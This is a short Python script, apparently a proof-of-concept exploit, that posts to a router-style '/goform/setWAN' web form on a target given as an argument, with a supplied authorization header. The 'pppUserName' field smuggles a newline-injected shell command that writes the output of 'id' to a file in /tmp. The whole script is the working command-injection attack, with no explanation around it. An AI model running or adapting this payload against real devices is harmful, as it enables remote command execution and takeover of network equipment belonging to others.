import sys
import urllib.parse
import urllib.request

fields = {
    'wanMode': '2',
    'pppUserName': '\nid > /tmp/marker_line #',
    'submit-url': '/wan.asp',
}
request = urllib.request.Request(sys.argv[1] + '/goform/setWAN',
    data=urllib.parse.urlencode(fields).encode(), method='POST')
request.add_header('Authorization', sys.argv[2])
with urllib.request.urlopen(request, timeout=5) as response:
    print(response.status)
